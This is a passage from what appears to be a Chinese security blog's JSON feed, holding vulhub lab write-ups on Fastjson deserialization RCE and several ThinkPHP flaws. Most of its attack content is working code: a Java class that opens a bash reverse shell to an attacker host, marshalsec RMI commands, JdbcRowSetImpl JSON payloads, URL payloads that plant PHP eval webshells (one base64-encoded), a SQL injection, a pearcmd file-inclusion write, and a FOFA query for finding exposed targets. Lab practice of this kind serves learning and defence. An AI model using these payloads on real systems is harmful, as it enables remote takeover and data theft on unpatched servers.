&quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-25%20174829.png\" alt=\"屏幕截图 2024-04-25 174829\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425175440976.png\" alt=\"image-20240425175440976\"></p>\n<p>也可以直接进入docker容器中进行查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exex –it 你的CONTAINER_ID bash</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>上面的过程理解之后</strong>，然后开始尝试getshell，还是先编译payload，注意修改里面的ip和端口，还有一点需要注意，该Java文件的文件名需要和其内容中的public后的公共类相同，具体参考java的命名规范，否则是会出现编译错误的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javac GetShell.java</span><br><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"> </span><br><span class=\"line\">public class GetShell &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.100.131/7777 0&gt;&amp;1&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>nc开启监听，等待shell反弹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182200299.png\" alt=\"image-20240425182200299\"></p>\n<p>python开启http服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182338663.png\" alt=\"image-20240425182338663\"></p>\n<p>开启RMI服务，并监听9999端口，注意修改对应内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999 </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182500809.png\" alt=\"image-20240425182500809\"></p>\n<p>BP抓包，改为POST请求方法，修改Content-Type，加入payload(注意修改内容)并发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 173</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后就发现已经成功进行getshell操作了</p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183720913.png\" alt=\"image-20240425183720913\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183748769.png\" alt=\"image-20240425183748769\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183934178.png\" alt=\"image-20240425183934178\"></p>\n<p><strong>或利用工具进行漏洞验证</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -l tvcy5n.dnslog.cn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195446761.png\" alt=\"image-20240425195446761\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/TouchFile</span><br><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/GetShell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195613834.png\" alt=\"image-20240425195613834\"></p>\n<h1 id=\"1-2-47-rce\"><a href=\"#1-2-47-rce\" class=\"headerlink\" title=\"1.2.47-rce\"></a>1.2.47-rce</h1><h2 id=\"漏洞原理：-1\"><a href=\"#漏洞原理：-1\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>\n<h2 id=\"漏洞复现：-1\"><a href=\"#漏洞复现：-1\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>基本流程手法和上面一个漏洞基本相同，只是最后的BP发送的payload稍稍有点区别</p>\n<p>和上一个一样，先开启各项服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br><span class=\"line\">python -m http.server 5555</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202024134.png\" alt=\"image-20240425202024134\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202135914.png\" alt=\"image-20240425202135914\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202210491.png\" alt=\"image-20240425202210491\"></p>\n<p>然后BP抓包，修改POST方法，修改Content-Type，修改payload发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 272</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;a&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class=\"line\">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202527880.png\" alt=\"image-20240425202527880\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202511365.png\" alt=\"image-20240425202511365\"></p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130100893\">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>\n<p><a href=\"https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html\">https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html</a></p>\n<p><a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><a href=\"https://www.cnblogs.com/karsa/p/15983486.html\">https://www.cnblogs.com/karsa/p/15983486.html</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】ThinkPHP漏洞复现",
            "date_published": "2024-04-24T16:11:39.373Z",
            "content_html": "<h1 id=\"【vulhub】ThinkPHP漏洞复现\"><a href=\"#【vulhub】ThinkPHP漏洞复现\" class=\"headerlink\" title=\"【vulhub】ThinkPHP漏洞复现\"></a>【vulhub】ThinkPHP漏洞复现</h1><p>​\tPHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。<br>​\tThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。</p>\n<h1 id=\"2-rce\"><a href=\"#2-rce\" class=\"headerlink\" title=\"2-rce\"></a>2-rce</h1><h2 id=\"漏洞原理：\"><a href=\"#漏洞原理：\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP 2.x版本中，使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;@(\\w+)&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;([^&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;\\/]+)@e&#x27;</span>, <span class=\"string\">&#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;</span>, <span class=\"title function_ invoke__\">implode</span>(<span class=\"variable\">$depr</span>,<span class=\"variable\">$paths</span>));</span><br></pre></td></tr></table></figure>\n\n<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>\n<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>\n<p>具体原理过程参考文章：<a href=\"https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89\">https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）</a></p>\n<h2 id=\"漏洞复现：\"><a href=\"#漏洞复现：\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>根据对漏洞原理的理解，构造payload，获取phpinfo信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png\" alt=\"image-20240424170222558\"></p>\n<p>构造payload，配合蚁剑等工具进行连接，获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[sqrt7]))&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png\" alt=\"image-20240424170623602\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png\" alt=\"image-20240424170654949\"></p>\n<h1 id=\"5-0-23-rce\"><a href=\"#5-0-23-rce\" class=\"headerlink\" title=\"5.0.23-rce\"></a>5.0.23-rce</h1><h2 id=\"漏洞原理：-1\"><a href=\"#漏洞原理：-1\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>\n<p>实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行</p>\n<p> 影响版本</p>\n<p>ThinkPHP 5.0.x<del>5.0.23<br>ThinkPHP 5.1.x</del>5.1.31<br>ThinkPHP 5.2.0beta1</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://blog.csdn.net/solitudi/article/details/113796433\">https://blog.csdn.net/solitudi/article/details/113796433</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-1\"><a href=\"#漏洞复现：-1\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>BP抓包修改数据，执行命令，获取信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?s=captcha</span><br><span class=\"line\"></span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png\" alt=\"屏幕截图 2024-04-24 191819\"></p>\n<p>尝试创建后门，利用蚁剑进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?s=captcha</span><br><span class=\"line\"></span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval(\\$_POST[sqrt7])?&gt;&quot; &gt;&gt; sqrt.php</span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&quot;|base64 -d &gt;&gt; sqrt.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png\" alt=\"image-20240424192934769\"></p>\n<h1 id=\"5-rce\"><a href=\"#5-rce\" class=\"headerlink\" title=\"5-rce\"></a>5-rce</h1><h2 id=\"漏洞原理：-2\"><a href=\"#漏洞原理：-2\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>\n<p>影响版本</p>\n<p>ThinkPHP5:<br>5.0.x<del>5.0.23；<br>5.1.0</del>5.1.30；<br>不同版本payload不同， 5.1.13之后还与debug模式有关</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://www.freebuf.com/articles/web/289860.html\">https://www.freebuf.com/articles/web/289860.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-2\"><a href=\"#漏洞复现：-2\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>构造payload，执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br><span class=\"line\"></span><br><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png\" alt=\"image-20240424230451281\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png\" alt=\"image-20240424230509901\"></p>\n<p>尝试写入后门木马进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">payload解释：调用file_put_contents方法将&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;写入shell.php文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png\" alt=\"image-20240424231120979\"></p>\n<h1 id=\"in-sqlinjection\"><a href=\"#in-sqlinjection\" class=\"headerlink\" title=\"in-sqlinjection\"></a>in-sqlinjection</h1><h2 id=\"漏洞原理：-3\"><a href=\"#漏洞原理：-3\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</p>\n<p>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。</p>\n<p>重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。</p>\n<p>影响版本<br>ThinkPHP &lt; 5.1.23<br>该漏洞的形成最关键一点是需要开启debug模式</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html\">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-3\"><a href=\"#漏洞复现：-3\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134/index.php?ids[]=1&amp;ids[]=2</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png\" alt=\"image-20240424234654144\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png\" alt=\"image-20240424235410605\"></p>\n<h1 id=\"lang-rce\"><a href=\"#lang-rce\" class=\"headerlink\" title=\"lang-rce\"></a>lang-rce</h1><h2 id=\"漏洞原理：-4\"><a href=\"#漏洞原理：-4\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。</p>\n<p>虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&#x2F;pear的环境下，可以包含&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php并写入任意文件。</p>\n<p>影响版本：</p>\n<p>6.0.1 &lt; ThinkPHP≤ 6.0.13</p>\n<p>5.0.0 &lt; ThinkPHP≤ 5.0.12</p>\n<p>5.1.0 &lt; ThinkPHP≤ 5.1.8</p>\n<p><strong>利用条件：</strong></p>\n<p>1、需要Thinkphp开启多语言功能</p>\n<p>2、安装pear扩展</p>\n<p>3、知道pearcmd.php路径</p>\n<p>4、register_argc_argv&#x3D;on</p>\n<h2 id=\"漏洞复现：-4\"><a href=\"#漏洞复现：-4\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>进行漏洞验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();?&gt;+shell.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png\" alt=\"image-20240425091852033\"></p>\n<p>传入后门木马，进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();eval($_REQUEST[7]);?&gt;+sqrt.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png\" alt=\"image-20240425091917700\"></p>\n<p><strong>FOFA搜索语法：</strong></p>\n<blockquote>\n<p>header&#x3D;”think_lang”</p>\n</blockquote>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Yeoman92/article/details/53064670\">https://blog.csdn.net/Yeoman92/article/details/53064670</a></p>\n<p><a href=\"https://www.freebuf.com/sectool/223149.html\">https://www.freebuf.com/sectool/223149.html</a></p>\n<p><a href=\"https://blog.csdn.net/solitudi/article/details/113796433\">https://blog.csdn.net/solitudi/article/details/113796433</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/289860.html\">https://www.freebuf.com/articles/web/289860.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html\">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_51922767/article/details/126859373\">https://blog.csdn.net/qq_51922767/article/details/126859373</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_42253265/article/details/111593955\">https://blog.csdn.net/weixin_42253265/article/details/111593955</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Tomcat漏洞复现",
            "date_published": "2024-04-24T02:46:27.742Z",
